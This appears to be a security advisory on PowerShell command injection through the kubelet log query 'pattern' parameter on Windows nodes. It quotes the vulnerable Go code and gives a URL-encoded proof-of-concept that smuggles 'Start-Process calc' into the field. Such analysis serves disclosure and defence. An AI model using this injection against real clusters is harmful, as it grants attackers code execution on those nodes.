Title: PowerShell Command Injection in Kubelet Log Query on Windows Nodes (CVE-2023-39343 / CVE-2023-2723 style)
Analysis:
The kubelet's node log query mechanism on Windows is vulnerable to PowerShell command injection. When querying service logs via the `/proxy/logs` endpoint, the `pattern` query parameter is processed by `nodeLogQuery.Pattern`. In `pkg/kubelet/kubelet_server_journal_windows.go`, `getLoggingCmd` constructs a PowerShell command using string formatting:

```go
if len(n.Pattern) > 0 {
    psCmd += fmt.Sprintf(" | Where-Object -Property Message -Match '%s'", n.Pattern)
}
```

The validation of `n.Pattern` in `nodeLogQuery.validate()` only checks if the pattern is a syntactically valid Perl regular expression using `syntax.Parse(n.Pattern, syntax.Perl)`. Since a regular expression can easily contain single quotes and semicolons while remaining syntactically valid (e.g., `.*'; <arbitrary PowerShell command>; '`), an attacker with privileges to query node logs can inject and execute arbitrary PowerShell commands on the Windows node.

Conceptual Exploit Payload:
An attacker sends a GET request to the kubelet's logs endpoint on a Windows node:
`/logs/?query=kubelet&pattern=.*%27%3b+Start-Process+calc%3b+%27`

This URL decodes to the pattern `.*'; Start-Process calc; '`.
The resulting PowerShell command executed by the kubelet is:
`Get-WinEvent -FilterHashtable @{LogName='Application'; ProviderName='kubelet'} | Sort-Object TimeCreated | Where-Object -Property Message -Match '.*'; Start-Process calc; '' | Format-Table -AutoSize -Wrap`

This runs `Start-Process calc` under the context of the kubelet service on the Windows node.
